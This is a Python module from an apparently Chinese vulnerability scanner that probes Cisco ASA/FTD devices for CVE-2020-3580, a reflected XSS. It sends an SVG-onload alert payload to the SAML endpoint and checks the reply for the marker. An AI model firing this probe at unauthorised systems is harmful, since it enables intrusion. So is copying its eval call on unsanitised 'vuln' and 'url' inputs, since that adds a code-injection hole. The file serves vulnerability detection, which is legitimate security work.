#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Cisco相关设备/页面扫描类: 
        Cisco ASA设备/FTD设备 XSS跨站脚本攻击
            CVE-2020-3580
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class Cisco():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Cisco'
        self.md = md5(self.app_name)

        self.cve_2020_3580_payloads = [
            {
                'path': '+CSCOE+/saml/sp/acs?tgname=a',
                'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dalert(\'{}\')%3e'.format('3580')
            }
        ]

    def cve_2020_3580_scan(self, url):
        ''' Cisco ASA设备/FTD设备 XSS跨站脚本攻击
                反射型
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'XSS'
        vul_info['vul_id'] = 'CVE-2020-3580'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_3580_payloads:     # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if ("alert('3580')" in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_3580_scan, url=url)
        ]

cisco = Cisco()